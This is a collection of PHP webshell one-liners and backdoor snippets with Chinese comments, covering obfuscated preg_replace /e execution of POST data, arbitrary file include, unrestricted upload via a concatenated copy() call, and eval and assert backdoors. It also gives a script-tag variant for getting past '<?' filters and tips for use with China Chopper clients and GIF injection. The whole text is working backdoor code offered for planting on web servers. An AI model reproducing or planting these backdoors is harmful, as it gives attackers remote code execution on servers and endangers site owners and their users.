
```php
1、
$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$hh("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
2、
$filename=$_GET['xbid'];
include ($filename);
//危险的include函数，直接编译任何文件为php格式运行
3、
$reg="c"."o"."p"."y";
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
//重命名任何文件
4、
$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$gzid("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
5、
include ($uid);
//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif
//gif插一句话
6、
程序后门代码
<?php eval_r($_POST[sb])?>
程序代码
<?php @eval_r($_POST[sb])?>
//容错代码
程序代码
<?php assert($_POST[sb]);?>
//使用lanker一句话客户端的专家模式执行相关的php语句
程序代码
<?$_POST['sa']($_POST['sb']);?>
程序代码
<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
程序代码
<?php
@preg_replace("/[email]/e",$_POST['h'],"error");
?>
//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
程序代码
<O>h=@eval_r($_POST1);</O>
程序代码
<script language="php">@eval_r($_POST[sb])</script>
//绕过<?限制的一句话
```